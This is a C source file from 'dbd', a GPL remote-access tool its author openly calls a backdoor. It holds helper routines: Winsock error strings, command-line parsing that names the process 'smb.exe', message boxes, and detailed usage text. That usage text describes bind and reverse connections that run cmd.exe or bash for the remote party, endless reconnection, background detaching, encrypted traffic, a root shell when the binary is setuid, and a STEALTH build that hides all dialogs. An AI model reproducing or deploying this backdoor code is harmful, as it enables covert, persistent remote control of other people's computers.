/*
 * dbd - durandal's backdoor
 * Copyright (C) 2013 Kyle Barnthouse <durandal@gitbrew.org>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation; either version 2 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc., 59
 * Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 * See the COPYING file for more information.
 */


#ifdef WIN32
char *WSAstrerror(DWORD my_wsagetlasterror) {
    switch (my_wsagetlasterror) {
        case WSABASEERR:
            return "WSABASEERR";
        case WSAEINTR:
            return "WSAEINTR";
        case WSAEBADF:
            return "WSAEBADF";
        case WSAEACCES:
            return "WSAEACCES";
        case WSAEFAULT:
            return "WSAEFAULT";
        case WSAEINVAL:
            return "WSAEINVAL";
        case WSAEMFILE:
            return "WSAEMFILE";
        case WSAEWOULDBLOCK:
            return "WSAEWOULDBLOCK";
        case WSAEINPROGRESS:
            return "WSAEINPROGRESS";
        case WSAEALREADY:
            return "WSAEALREADY";
        case WSAENOTSOCK:
            return "WSAENOTSOCK";
        case WSAEDESTADDRREQ:
            return "WSAEDESTADDRREQ";
        case WSAEMSGSIZE:
            return "WSAEMSGSIZE";
        case WSAEPROTOTYPE:
            return "WSAEPROTOTYPE";
        case WSAENOPROTOOPT:
            return "WSAENOPROTOOPT";
        case WSAEPROTONOSUPPORT:
            return "WSAEPROTONOSUPPORT";
        case WSAESOCKTNOSUPPORT:
            return "WSAESOCKTNOSUPPORT";
        case WSAEOPNOTSUPP:
            return "WSAEOPNOTSUPP";
        case WSAEPFNOSUPPORT:
            return "WSAEPFNOSUPPORT";
        case WSAEAFNOSUPPORT:
            return "WSAEAFNOSUPPORT";
        case WSAEADDRINUSE:
            return "WSAEADDRINUSE";
        case WSAEADDRNOTAVAIL:
            return "WSAEADDRNOTAVAIL";
        case WSAENETDOWN:
            return "WSAENETDOWN";
        case WSAENETUNREACH:
            return "WSAENETUNREACH";
        case WSAENETRESET:
            return "WSAENETRESET";
        case WSAECONNABORTED:
            return "WSAECONNABORTED";
        case WSAECONNRESET:
            return "WSAECONNRESET";
        case WSAENOBUFS:
            return "WSAENOBUFS";
        case WSAEISCONN:
            return "WSAEISCONN";
        case WSAENOTCONN:
            return "WSAENOTCONN";
        case WSAESHUTDOWN:
            return "WSAESHUTDOWN";
        case WSAETOOMANYREFS:
            return "WSAETOOMANYREFS";
        case WSAETIMEDOUT:
            return "WSAETIMEDOUT";
        case WSAECONNREFUSED:
            return "WSAECONNREFUSED";
        case WSAELOOP:
            return "WSAELOOP";
        case WSAENAMETOOLONG:
            return "WSAENAMETOOLONG";
        case WSAEHOSTDOWN:
            return "WSAEHOSTDOWN";
        case WSAEHOSTUNREACH:
            return "WSAEHOSTUNREACH";
        case WSAENOTEMPTY:
            return "WSAENOTEMPTY";
        case WSAEPROCLIM:
            return "WSAEPROCLIM";
        case WSAEUSERS:
            return "WSAEUSERS";
        case WSAEDQUOT:
            return "WSAEDQUOT";
        case WSAESTALE:
            return "WSAESTALE";
        case WSAEREMOTE:
            return "WSAEREMOTE";
        case WSAEDISCON:
            return "WSAEDISCON";
        case WSASYSNOTREADY:
            return "WSASYSNOTREADY";
        case WSAVERNOTSUPPORTED:
            return "WSAVERNOTSUPPORTED";
        case WSANOTINITIALISED:
            return "WSANOTINITIALISED";
        case WSAHOST_NOT_FOUND:
            return "WSAHOST_NOT_FOUND";
        case WSATRY_AGAIN:
            return "WSATRY_AGAIN";
        case WSANO_RECOVERY:
            return "WSANO_RECOVERY";
        case WSANO_DATA:
            return "WSANO_DATA";
        default:
    	    return "Unknown winsock error";
    }
}
#endif


#if defined WIN32 && defined WINMAIN && defined STEALTH
    /*nop*/
#else
/* get RCS id */
unsigned char *get_revision(unsigned char *string) {
/*
 * input string is an RCS Id keyword
 */
    char Id_string[] = "$Id: ";
    char *idstart;
    static unsigned char revision[16];
    int i, x, column_counter;

    if (!(idstart = strstr(string, Id_string))) {
        return NULL;
    }

    idstart += strlen(Id_string);

    column_counter = 1;
    for (i = 0, x = 0; x < (sizeof(revision)-1); i++) {
        if (idstart[i] == 0)
            return NULL;

        if (column_counter < 2) {
            if (idstart[i] == 0x20)
                column_counter++;
        } else {      /* column 2 is the rcs revision number */
            if (((idstart[i] < '0') || (idstart[i] > '9')) && (idstart[i] != '.'))
                break;
            revision[x] = idstart[i];
            x++;
        }
    }

    revision[x] = 0;
    return revision;
}
#endif


#if defined WIN32 && defined WINMAIN

/*
    ParseCommandLine() was derived from some forum (forgot which) :\
    author is unknown to me!
*/
void ParseCommandLine (LPSTR lpCmdLine) {
    argc = 1;

    if (!(argv[0] = strdup("smb.exe"))) {
        #ifndef STEALTH
            MessageBox(NULL, "strdup() failed!", "error!", MB_OK | MB_ICONERROR);
        #endif
        exit(1);
    }

    while (*lpCmdLine && (argc < MAX_NUM_ARGVS)) {
	while (*lpCmdLine && ((*lpCmdLine <= 32) || (*lpCmdLine > 126))) {
	    lpCmdLine++;
        }
	if (*lpCmdLine) {
	    argv[argc] = lpCmdLine;
	    argc++;
	    while (*lpCmdLine && ((*lpCmdLine > 32) && (*lpCmdLine <= 126))) {
		lpCmdLine++;
            }
	    if (*lpCmdLine) {
		*lpCmdLine = 0;
		lpCmdLine++;
	    }
	}
    }
}

#ifndef STEALTH
/* return "on" or "off" if an int is 1 or 0 respectively */
char *on_or_off(int boolean) {
    if (boolean)
        return "on";
    else
        return "off";
}

void message_box_usage(void) {
    char buf[2048];

    snprintf(buf, sizeof(buf),
        "dbd %s Copyright (C) 2013 Kyle Barnthouse <durandal@gitbrew.org>\n"
        "\n"
        "connect (tcp):dbdbg.exe [-options] host port\n"
        "listen (tcp): dbdbg.exe -l -p port [-options]\n"
        "-l : listen for incoming connection\n"
        "-p : choose port to listen on, or source port to connect from\n"
    	"-a : choose address to listen on or connect out from\n"
        "-e exe : program to execute after connect, e.g.: -e cmd.exe\n"
        "-r n : infinitely reconnect, pause for n seconds between connects, use -r0 with -l\n"
        "-c on|off : turn on/off AES-128 encryption. default: -c %s\n"
        "-k secret : override hardcoded passphrase for the -c option\n"
        "-q : be quiet, don't show MessageBoxes\n"
        "-n : numeric-only IP addresses, don't do DNS resolution.\n"
        "-V : show a MessageBox with version info\n"
        "\n"
        "win32 specific options:\n"
        "-D on|off : turn on/off whether to detach from the console. default is: -D %s\n"
        "-X on|off : turn on/off conversion of LF/CR to CR+LF (only for -e). default is: -X %s\n"
        "-1 on|off : turn on/off whether to run only one instance of dbd or not. default is: -1 %s\n",
        get_revision(rcsid),
        on_or_off(use_encryption),
        on_or_off(daemonize),
        on_or_off(convert_to_crlf),
        on_or_off(only_one_instance));

    if (!quiet)
        MessageBox(NULL, buf, "dbd usage", MB_OK);

    return;
}

/* error MessageBox */
void errbox(char *msg) {
    MessageBox(NULL, msg, "dbd", MB_OK | MB_ICONERROR);
    return;
}


void displayAmbitiousErrbox(char *prefix, DWORD err) {
    LPVOID lpMsgBuf;
    char msg[256];

    if (!FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL,
            err,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
            (LPTSTR) &lpMsgBuf,
            0,
            NULL )) {
                /* handle error */
                return;
            }
    snprintf(msg, sizeof(msg), "%s%u: %s",
        prefix, (unsigned int)err, (char *)lpMsgBuf);
    errbox(msg);
    LocalFree(lpMsgBuf);
}


/* info MessageBox */
void infobox(char *msg) {
    MessageBox(NULL, msg, "dbd", MB_OK | MB_ICONINFORMATION);
    return;
}

/* winsock error MessageBox */
void wsaerrbox(char *msg, DWORD wsaerr) {
    char buf[256];
    snprintf(buf, sizeof(buf), "%s: %s", msg, WSAstrerror(wsaerr));
    MessageBox(NULL, buf, "dbd", MB_OK | MB_ICONERROR);
    return;
}

/* display version info MessageBox */
void verbox(void) {
    char buf1[1024];
    char buf2[16];

    snprintf(buf1, sizeof(buf1), "dbd %s Copyright (C) 2012 Kyle Barnthouse <durandal@gitbrew.org>\n"
           "%s\n"
           "http://gitbrew.org\n"
           "dbd is distributed under the GNU General Public License v2",
           get_revision(rcsid), rcsid);
    snprintf(buf2, sizeof(buf2), "dbd %s", get_revision(rcsid));

    MessageBox(NULL, buf1, buf2, MB_OK | MB_ICONINFORMATION);

    return;
}


/*
    a non-blocking MessageBox.
    this is implemented by creating a thread (quite lame approach, I know, but
    it's what I got) :\
 */

typedef struct {
    char *msg;
    int thread_lock;
} mbstruct, *pmbstruct;

static VOID messagebox_thread(LPVOID Parameter) {
    pmbstruct mbs = Parameter;
    char buf[512];
    strncpy(buf, mbs->msg, sizeof(buf));
    mbs->thread_lock = 0;
    MessageBox(NULL, buf, "dbd", MB_OK);
    ExitThread(0);
}

void forkmsgbox(char *msg, int length) {
    char *omsg;
    pmbstruct m;
    DWORD ThreadId;
    HANDLE h;

    if (!length)
        return;

    /* shorten length */
    if (length > 500)
        length = 500;

    if (!(omsg = malloc(length+1)))
        return;

    memcpy(omsg, msg, length);
    omsg[length] = 0;

    if (!(m = (pmbstruct) malloc(sizeof(mbstruct)))) {
        free(omsg);
        return;
    }

    m->msg = omsg;
    m->thread_lock = 1;

    h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) messagebox_thread,
                    (LPVOID) m, 0, &ThreadId);

    if (h) {
        CloseHandle(h);
        while (m->thread_lock == 1) {
            Sleep(50);
            continue;
        }
        Sleep(50);
    }

    free(m);
    free(omsg);
    return;
}

#endif



#else
    /* for unix and win32 console app */

/*
 * print_banner() prints version and copyright info
 */
void print_version(void) {
    printf("dbd %s Copyright (C) 2013 Kyle Barnthouse <durandal@gitbrew.org>\n"
           "%s\n"
           "\n"
           "This program is free software; you can redistribute it and/or modify it under\n"
           "the terms of the GNU General Public License as published by the Free Software\n"
           "Foundation; either version 2 of the License, or (at your option) any later\n"
           "version.\n",
           get_revision(rcsid), rcsid);
    return;
}

/* return "on" or "off" if an int is 1 or 0 respectively */
char *on_or_off(int boolean) {
    if (boolean)
        return "on";
    else
        return "off";
}

/*
 * usage() prints dbd syntax/usage info
 */
void usage(void) {
    print_version();
    printf(
"\n"
"connect (tcp): dbd [-options] host port\n"
"listen (tcp):  dbd -l -p port [-options]\n"
"options:\n"
"    -l          listen for incoming connection\n"
"    -p n        choose port to listen on, or source port to connect out from\n"
"    -a address  choose an address to listen on or connect out from\n"
"    -e prog     program to execute after connect (e.g. -e cmd.exe or -e bash)\n"
"    -r n        infinitely respawn/reconnect, pause for n seconds between\n"
"                connection attempts. -r0 can be used to re-listen after\n"
"                disconnect (just like a regular daemon)\n"
"    -c on|off   encryption on/off. specify whether you want to use the built-in\n"
"                AES-CBC-128 + HMAC-SHA1 encryption implementation (by\n"
"                Christophe Devine - http://www.cr0.net:8040/) or not\n"
"                default is: -c %s\n"
"    -k secret   override default phrase to use for encryption (secret must be\n"
"                shared between client and server)\n"
"    -q          hush, quiet, don't print anything (overrides -v)\n"
"    -v          be verbose\n"
"    -n          toggle numeric-only IP addresses (don't do DNS resolution). if\n"
"                you specify -n twice, original state will be active (i.e. -n\n"
"                works like a on/off switch)\n"
"    -m          toggle monitoring (snooping) on/off (only used with the -e\n"
"                option). snooping can also be turned on by specifying -vv (-v\n"
"                two times)\n"
"    -P prefix   add prefix (+ a hardcoded separator) to all outbound data.\n"
"                this option is mostly only useful for dbd in \"chat mode\" (to\n"
"                prefix lines you send with your nickname)\n"
"    -H on|off   highlight incoming data with a hardcoded (color) escape\n"
"                sequence (for e.g. chatting). default is: -H %s\n"
"    -V          print version banner and exit (include that output in your\n"
"                bug report and send bug report to michel.blomgren@tigerteam.se)\n"
#ifdef WIN32
"win32 specific options:\n"
"    -D on|off   detach from console (FreeConsole()) (on=yes or off=no)\n"
"                default is: -D %s\n"
"    -X on|off   when using the -e option, translate incoming bare LFs or CRs\n"
"                to CR+LF (this must be on if you're executing command.com on\n"
"                Win9x). default is: -X %s\n"
"    -1 on|off   whether to make dbd run only one instance of itself or not.\n"
"                instance check is implemented using CreateSemaphore() (with an\n"
"                initcount and maxcount of 1) and WaitForSingleObject(). if\n"
"                WaitForSingleObject() returns WAIT_TIMEOUT we assume there's\n"
"                already an instance running. default is: -1 %s\n"
"note: when receiving files under win32, always use something like this:\n"
"C:\\>dbd -lvp 1234 < NUL > outfile.ext\n",
        on_or_off(use_encryption),
        on_or_off(highlight_incoming),
        on_or_off(daemonize),
        on_or_off(convert_to_crlf),
        on_or_off(only_one_instance));
#else
"unix-like OS specific options:\n"
"    -s          invoke a shell, nothing else. if dbd is setuid 0, it'll invoke\n"
"                a root shell\n"
"    -w n        \"immobility timeout\" in seconds for idle read/write operations\n"
"                and program execution (the -e option)\n"
"    -D on|off   fork and run in background (daemonize). default: -D %s\n",
        on_or_off(use_encryption),
        on_or_off(highlight_incoming),
        on_or_off(daemonize));
#endif

    return;
}

#endif

